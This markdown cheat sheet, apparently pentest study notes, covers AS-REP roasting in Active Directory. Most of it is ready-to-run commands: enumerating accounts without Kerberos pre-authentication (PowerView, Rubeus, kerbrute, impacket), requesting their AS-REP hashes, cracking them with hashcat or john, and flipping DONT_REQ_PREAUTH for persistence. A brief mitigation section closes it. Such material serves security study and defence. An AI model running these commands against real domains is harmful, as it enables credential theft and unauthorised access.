### Content

- [From Windows](#from-windows)
	- [Enumeration](#enumeration)
	- [Exploitation](#exploitation)
- [From Linux](#from-linux)
	- [Enumeration](#enumeration)
	- [Exploitation](#exploitation)
- [Mitigation](#mitigation)

---

> [!Important]
> 
> `$ hashcat -m 18200 toCrack.txt /usr/share/wordlists/rockyou.txt `
> `$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep toCrack.txt`

- It's possible to obtain the (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled.
- Authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.
- TGT is subjected to an offline password attack as it's encrypted with the user password's NTLM hash.

<img src="/assets/preauth_not_reqd_mmorgan.webp" style="display: block; margin:auto; width:80%; height:60%;">

AS-REPRoasting can be used for:

- `Persistence`: setting the bit `DONT_REQ_PREAUTH` flag on accounts would allow attackers to regain access to domain account even after a password reset.
- `Privilege Escalation`: When an attacker has the ability change any attribute of an account but not the ability to log in without knowing or resetting the password. Password resets are dangerous as they have a high probability of raising alarms. Instead of resetting the password, attackers can enable this bit and attempt to crack the account's password hash.

Suppose an attacker has `GenericWrite` or `GenericAll` permissions over an account. In that case, they can enable this attribute and obtain the AS_REP ticket before disabling it again.

```PowerShell
# Set DONT_REQ_PREAUTH with PowerView
PS C:\> Set-DomainObject -Identity <samAccountName> -XOR @{useraccountcontrol=4194304} -Verbose
```

---
### From Windows

#### Enumeration

```powershell
# Using ActiveDirectory module:
Get-ADUser -Filter { (UserAccountControl -band 4194304) -and (Enabled -eq $true) } -Properties * | Select SamAccountName,userAccountControl,userprincipalname | fl
# Or
Get-ADUser -filter * -properties DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name 

# Using Powerview
PS C:\> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
# Or
PS C:\> Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Using Rubeus
C:\Rubeus>Rubeus.exe preauthscan /users:uns.txt /domain:corp.local /dc:<IP>
```

Decode the `userAccountControl` in [uac-decoder](https://www.techjutsu.com/uac-decoder)

#### Exploitation

```Powershell
# Using Rubeus
# From a joined domain account session
# Target a specific user:
PS C:\> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
# Extract all the as-reproastable users:
PS C:\> .\Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
# None domain user:
PS C:\> .\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
```

---
### From Linux

#### Enumeration

```PowerShell
# kerbrute will retrieve the AS-REP for any users found that do not require Kerberos pre-authentication while user enumeration
$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# Using impacket-GetNPUsers 
$ impacket-GetNPUsers corp.local/'USERNAME':'PASSWORD'
```

#### Exploitation

```bash 
# To request AS-REP for every as-preroastable user
$ impacket-GetNPUsers corp.local/'USERNAME':'PASSWORD' -request -outputfile hashes.txt

# With a list of valid users and whithout authenticatation
$ impacket-GetNPUsers corp.local/  -dc-ip 172.16.5.5 -no-pass -usersfile users.txt -format hashcat -outputfile out.txt 
```

---
### Mitigation

- Don't set users with Kerberos pre-authentication disabled. Some service accounts may require it (older protocols), but enable pre-authentication for all accounts where possible.
- Ensure the use of strong encryption algorithms with Kerberos. Move away from RC4.
- Protect and monitor Service Accounts with strong passwords and watch logs for unusual activity from these accounts (access files or resources not commonly utilized).

Once accounts have been identified with enabled `Do not require Kerberos preauthentication` to mitigate it:

- Open `Active Directory Users and Computers`
- Select the user we wish to investigate and then go to the Account tab. 
	- Look in the Account options scroll box for the line `Do not require Kerberos preauthentication`.
		- If this box is checked, uncheck it.

---